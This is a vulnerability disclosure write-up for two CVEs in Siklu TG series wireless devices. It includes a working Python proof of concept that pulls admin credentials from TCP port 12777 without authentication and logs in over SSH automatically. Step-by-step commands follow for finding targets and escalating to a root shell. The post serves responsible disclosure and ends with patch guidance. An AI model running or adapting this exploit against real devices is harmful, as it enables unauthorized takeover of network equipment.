---
title: CVE-2022-47036 & CVE-2022-47037 - Siklu TG Series - Unauthenticated Credential Disclosure and Static Root Credentials
tags: research cve security siklu CVE-2022-47036 CVE-2022-47037
author: Andrew
---

## Investigation

Whilst performing a security review of the Siklu TG series of devices, I encountered an interesting behaviour that would allow the "access point" (_DN_) to have full control of its "stations" (_CN_) without any authentication.

Further investigation of this behaviour revealed the Clixon backend process with an IPv6 binding on `TCP 12777`, capturing traffic on this port revealed a sequence of commands which would disclose unique randomly generated credentials for remote administration.

By default all interfaces (ethernet/wireless) on the devices are enabled and attached to the
management plane. With access to an interface in the management plane, the exploit can be
utilised to gain admin level access.

During this investigation it was also noted the `root` user had a weak `md5crypt` hashed password, which was brute forced, but the only observable way to utilise this account remotely was with the `debug login` command once admin access to the device was obtained.


## Impact

Disclosure of device admin credentials allows for full control of the local device, and in the instance of the _DN_ would include all attached _CN_ devices.

The admin credentials can be used to disrupt service, and potentially adjust network configuration details to gain access to other VLANs.

If further `root` access is obtained on the device, a _CN_ would be able to repeat the attack to obtain access to the _DN_ via the `h2h` "host to host" interface on the devices which will bypass bridge filtering.

As the devices run the [Yocto](https://www.yoctoproject.org/) linux distro, once `root` is obtained almost any attack is possible in addition to persistance, such as sniffing network packets.


## Credential Disclosure Exploit PoC
```python
import socket
import sys
import os

address = str(sys.argv[1])  # the target
port = 12777

# Captured command, sends "GetCredentials" to obtain random generated username/password
cmd = bytearray.fromhex("000000290FFF000100000001000100000000800100010000000E47657443726564656E7469616C730000000000")

addrinfo = socket.getaddrinfo(address, port, socket.AF_INET6, socket.SOCK_STREAM)
(family, socktype, proto, canonname, sockaddr) = addrinfo[0]
s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
s.connect(sockaddr)
s.send(cmd)
data = s.recv(200)
s.close()
#print('Raw data: ', data)
output = "".join(map(chr, data))
#print('Force Converted: ', output)

# Split output, then remove trailing noise as string length is always 35
splits = output.split('#')
username = splits[1][slice(0, 35, 1)]
password = splits[2][slice(0, 35, 1)]
print('Username: ', username)
print('Password: ', password)
os.system("sshpass -p {password} ssh -o StrictHostKeychecking=no {address} -l {username}".format(address = address, username = username, password = password))
```

## Steps to reproduce
1. Ping the 'all hosts' multicast address for interface attached to victim device
    ```shell
    > ping6 -I en7 -c 2 ff02::1
    ```

2. Show all discovered neighbours, identify the victim device by MAC vendor
    ```shell
    > ip -6 neigh show dev en7
    fd3d:e051:727a:46fe:****:****:****:**** lladdr a0:ce:c8:**:**:** REACHABLE
    fe80::1c9f:****:****:**** lladdr a0:ce:c8:**:**:** REACHABLE
    fe80::34d9:1337:b33f:7001 lladdr 0:24:a4:**:**:** REACHABLE
    ```

3. Run exploit
    ```shell
    > python3 tg-getcreds.py fe80::34d9:1337:b33f:7001%en7
    Username:  3bEUccGF8IUTBd4pyOboFlkRIV2NVEuSgEg
    Password:  8J0a/eFkunhGwLsx3mGVgGHORgF4GXyS7gY
    MH-T265@17471234>
    ```
4. Upgrade to `root` shell
    ```shell
    MH-T265@17471234>debug login
    root>
    ```

## Outcomes
After submitting the disclosure report to Siklu they released the 2.1.1 firmware release for the TG series devices, which resolved the credential disclosure exploit.

Siklu did not provide public advice in the release notes of this security issue being resolved.

As for the static root password, it will be removed from new devices in a hardware fix, with no mitigations available for existing products.

These vulnerabilities were assigned the following CVE IDs
- [CVE-2022-47036](https://www.cve.org/CVERecord?id=CVE-2022-47036) - Hardcoded Root Credentials
- [CVE-2022-47037](https://www.cve.org/CVERecord?id=CVE-2022-47037) - Unauthenticated Credential Disclosure

**Affected Products:**

Siklu TG Series

**Mitigation:**

Update your Siklu TG Series devices to **Version 2.1.1 or later**.
